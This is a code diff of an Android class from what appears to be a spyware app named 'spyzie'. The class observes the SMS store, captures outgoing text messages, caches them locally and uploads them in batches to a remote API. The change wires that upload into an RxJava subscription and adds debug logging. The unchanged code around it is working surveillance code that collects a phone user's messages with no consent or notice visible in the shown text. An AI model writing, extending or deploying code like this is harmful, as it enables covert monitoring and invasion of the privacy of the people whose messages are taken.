@@ -5,30 +5,39 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.util.Log;
 
 import com.tantd.spyzie.data.db.AppDbManager;
 import com.tantd.spyzie.data.db.DbManager;
+import com.tantd.spyzie.data.model.CommonResponse;
 import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.data.network.AppApiManager;
 import com.tantd.spyzie.util.Constants;
 import com.tantd.spyzie.util.NetworkUtils;
+import com.tantd.spyzie.util.rx.AppSchedulerProvider;
+import com.tantd.spyzie.util.rx.SchedulerProvider;
 
 import java.util.List;
 
 public class SmsObserver extends ContentObserver {
 
-    private long lastSmsId;
+    private static final String DEBUG_SUB_TAG = "[" + SmsObserver.class.getSimpleName() + "] ";
+
     private Context mContext;
 
     private DbManager mDbManager;
     private ApiManager mApiManager;
+    private SchedulerProvider mSchedulerProvider;
+
+    private long lastSmsId;
 
     public SmsObserver(Handler handler, Context context) {
         super(handler);
         mContext = context;
         mDbManager = AppDbManager.getInstance();
         mApiManager = AppApiManager.getInstance();
+        mSchedulerProvider = AppSchedulerProvider.getInstance();
     }
 
     @Override
@@ -48,7 +57,10 @@ public class SmsObserver extends ContentObserver {
                 if (NetworkUtils.isNetworkConnected(mContext)) {
                     List<Sms> savedData = (List<Sms>) mDbManager.find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
                     savedData.add(outgoingSms);
-                    mApiManager.sendSmsData(savedData);
+                    mApiManager.sendSmsData(savedData).subscribeOn(mSchedulerProvider.io())
+                            .observeOn(mSchedulerProvider.ui())
+                            .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
+                                    error -> handleSendingError(error));
                     savedData.remove(savedData.size() - 1);
                     if (savedData.size() > 0) {
                         mDbManager.removeSms(savedData);
@@ -57,6 +69,18 @@ public class SmsObserver extends ContentObserver {
                     mDbManager.put(outgoingSms);
                 }
             }
+        }
+    }
+
+    private void handleSendingSuccess(CommonResponse response) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingSuccess, response=" + response);
+        }
+    }
+
+    private void handleSendingError(Throwable error) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
         }
     }
 }
